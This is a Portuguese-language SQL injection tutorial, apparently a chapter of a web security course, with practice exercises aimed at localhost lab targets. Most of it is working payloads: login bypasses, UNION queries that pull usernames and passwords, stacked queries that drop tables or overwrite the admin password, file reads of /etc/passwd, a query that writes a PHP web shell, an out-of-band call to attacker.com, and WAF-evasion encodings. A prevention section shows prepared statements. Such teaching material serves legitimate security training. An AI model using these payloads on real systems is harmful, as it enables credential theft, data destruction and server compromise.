# 💉 SQL Injection - Guia Completo

## 📚 Índice

1. [O que é SQL Injection?](#o-que-é-sql-injection)
2. [Como Funciona](#como-funciona)
3. [Tipos de SQL Injection](#tipos-de-sql-injection)
4. [Payloads Básicos](#payloads-básicos)
5. [Payloads Avançados](#payloads-avançados)
6. [Técnicas de Bypass](#técnicas-de-bypass)
7. [Detecção e Exploração](#detecção-e-exploração)
8. [Prevenção](#prevenção)
9. [Exercícios Práticos](#exercícios-práticos)

---

## O que é SQL Injection?

**SQL Injection (SQLi)** é uma vulnerabilidade de segurança web que permite que um atacante interfira nas consultas que uma aplicação faz ao banco de dados.

### Por que é Perigoso?

- ⚠️ Permite **ler dados sensíveis** do banco
- ⚠️ Pode **modificar ou deletar** dados
- ⚠️ Permite **executar operações administrativas**
- ⚠️ Pode comprometer todo o servidor
- ⚠️ Classificado como **HIGH/CRITICAL** no OWASP Top 10

---

## Como Funciona

### Código Vulnerável

```python
# VULNERÁVEL - NÃO FAÇA ISSO!
username = request.form['username']
password = request.form['password']

query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
cursor.execute(query)
```

### Exploit

Quando um atacante envia:
```
username: admin' OR '1'='1
password: qualquer_coisa
```

A query resultante é:
```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = 'qualquer_coisa'
```

Como `'1'='1'` é sempre verdadeiro, o atacante faz login sem senha!

---

## Tipos de SQL Injection

### 1. In-band SQLi (Clássica)

A resposta aparece diretamente na página.

#### Error-based SQLi
```sql
' OR 1=1--
```

#### UNION-based SQLi
```sql
' UNION SELECT username, password FROM users--
```

### 2. Blind SQLi

Sem resposta direta, usa inferência.

#### Boolean-based Blind SQLi
```sql
' AND 1=1--  (página normal)
' AND 1=2--  (página diferente)
```

#### Time-based Blind SQLi
```sql
' AND SLEEP(5)--  (demora 5 segundos se vulnerável)
```

### 3. Out-of-band SQLi

Usa canais externos (DNS, HTTP).

```sql
'; EXEC xp_dirtree '\\\\attacker.com\\a'--
```

---

## Payloads Básicos

### Authentication Bypass

```sql
-- Login sem senha
admin' OR '1'='1'--
admin'--
admin' #

-- Qualquer usuário
' OR '1'='1
' OR 'a'='a
') OR ('1'='1

-- SQL Server
admin'--
' OR 1=1--

-- MySQL
admin'#
' OR 1=1#

-- PostgreSQL
admin'--
' OR 1=1--
```

### Comentários SQL

```sql
--      MySQL, PostgreSQL, SQL Server
#       MySQL
/*...*/  Todos
```

### Testes Iniciais

```sql
'          # Aspas simples
''         # Duas aspas
`          # Backtick (MySQL)
"          # Aspas duplas
\          # Backslash
```

---

## Payloads Avançados

### UNION SELECT

```sql
-- Descobrir número de colunas
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
...até dar erro

-- UNION attack
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

-- Extrair dados
' UNION SELECT username,password FROM users--
' UNION SELECT NULL,username,password,NULL FROM users--
```

### Stacked Queries

```sql
-- Múltiplas queries
'; DROP TABLE users--
'; INSERT INTO users VALUES('hacker','pass')--
'; UPDATE users SET password='hacked' WHERE username='admin'--
```

### Reading Files (MySQL)

```sql
' UNION SELECT LOAD_FILE('/etc/passwd')--
' UNION SELECT LOAD_FILE('C:\\Windows\\win.ini')--
```

### Writing Files (MySQL)

```sql
' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--
```

---

## Técnicas de Bypass

### 1. Bypass de Filtros Simples

Se a aplicação bloqueia `OR`, `AND`, etc.:

```sql
-- Case variation
admin' Or '1'='1'--
admin' oR '1'='1'--

-- Comentários inline
admin' /*!50000OR*/ '1'='1'--
admin'/**/OR/**/1=1--

-- Encoding
admin' %4f%52 '1'='1'--  (OR em hex)
admin' UnIoN SeLeCt--

-- Double encoding
admin' %2527%252f%252a*/%252f--
```

### 2. Bypass de WAF

```sql
-- Concatenação
'||'1'='1
'+'1'='1

-- Notação científica
' OR 1E0='1
' OR 1.e1='10

-- Null bytes
admin'%00OR%00'1'='1

-- Caracteres Unicode
admin' %u004f%u0052 '1'='1'--
```

### 3. Bypass de Blacklist

Se bloqueia palavras específicas:

```sql
-- Palavras quebradas
UNI<>ON SEL<>ECT
UNI/**/ON SEL/**/ECT

-- Strings alternativas
UNION ALL SELECT
UNION DISTINCT SELECT
UNION SELECT ALL

-- Sinônimos
||  em vez de OR
&&  em vez de AND
```

---

## Detecção e Exploração

### Passo 1: Detecção

```sql
-- Teste de aspas
'
"
`
')
")

-- Teste de comentários
--
#
/*

-- Teste de lógica booleana
' OR '1'='1
' AND '1'='2
```

### Passo 2: Identificar SGBD

```sql
-- MySQL
' AND @@version--
' AND user()--

-- PostgreSQL
' AND version()--

-- SQL Server
' AND @@version--
' AND user_name()--

-- Oracle
' AND banner FROM v$version--
```

### Passo 3: Enumerar Banco

```sql
-- Listar databases (MySQL)
' UNION SELECT schema_name FROM information_schema.schemata--

-- Listar tabelas
' UNION SELECT table_name FROM information_schema.tables--

-- Listar colunas
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--

-- Extrair dados
' UNION SELECT username,password FROM users--
```

---

## Prevenção

### ✅ CORRETO: Prepared Statements

```python
# Python com parameterização
cursor.execute("SELECT * FROM users WHERE username = ? AND password = ?",
               (username, password))
```

```php
// PHP com PDO
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);
```

```java
// Java com PreparedStatement
PreparedStatement stmt = connection.prepareStatement(
    "SELECT * FROM users WHERE username = ? AND password = ?"
);
stmt.setString(1, username);
stmt.setString(2, password);
```

### ✅ Outras Medidas

1. **Input Validation**
   - Whitelist de caracteres permitidos
   - Validação de tipo de dados

2. **Least Privilege**
   - Usuário do banco com mínimos privilégios
   - Sem permissões de CREATE, DROP, etc.

3. **WAF (Web Application Firewall)**
   - ModSecurity
   - Cloudflare WAF

4. **Escaping** (não suficiente sozinho)
   ```python
   username = username.replace("'", "''")
   ```

---

## Exercícios Práticos

### Exercício 1: Basic SQLi

**Target**: http://localhost:5000/login

**Objetivo**: Fazer login como admin sem saber a senha

**Dica**: Use o payload clássico de bypass

<details>
<summary>Solução</summary>

```
Username: admin' OR '1'='1'--
Password: qualquer_coisa
```

Query resultante:
```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1'--' AND password = 'qualquer_coisa'
```

O `--` comenta o resto, e `'1'='1'` é sempre verdadeiro.
</details>

### Exercício 2: UNION SQLi

**Target**: http://localhost:5000/search

**Objetivo**: Extrair senhas de todos os usuários

**Dica**: Use UNION SELECT

<details>
<summary>Solução</summary>

1. Descobrir número de colunas:
```sql
' ORDER BY 1--  (funciona)
' ORDER BY 2--  (funciona)
' ORDER BY 3--  (funciona)
' ORDER BY 4--  (erro - são 3 colunas)
```

2. Extrair dados:
```sql
' UNION SELECT username,password,email FROM users--
```
</details>

### Exercício 3: Blind SQLi

**Target**: http://localhost:5001/api/search

**Objetivo**: Descobrir se usuário 'admin' existe usando Boolean-based

**Dica**: Compare respostas diferentes

<details>
<summary>Solução</summary>

```sql
-- Teste verdadeiro
test' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0--

-- Teste falso
test' AND (SELECT COUNT(*) FROM users WHERE username='notexist')>0--

-- Se as respostas forem diferentes, você confirmou que 'admin' existe
```
</details>

---

## 🎯 Checklist de Teste

- [ ] Testar aspas simples `'`
- [ ] Testar aspas duplas `"`
- [ ] Testar comentários `--`, `#`, `/**/`
- [ ] Testar OR/AND básico
- [ ] Testar UNION SELECT
- [ ] Testar ORDER BY para contar colunas
- [ ] Tentar bypass de filtros
- [ ] Testar time-based delays
- [ ] Tentar stacked queries
- [ ] Enumerar banco de dados

---

## 📚 Recursos Adicionais

- [PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [sqlmap Documentation](http://sqlmap.org/)

---

**Próximo**: [02-xss.md](02-xss.md) - Cross-Site Scripting

**Voltar**: [README.md](../README.md)
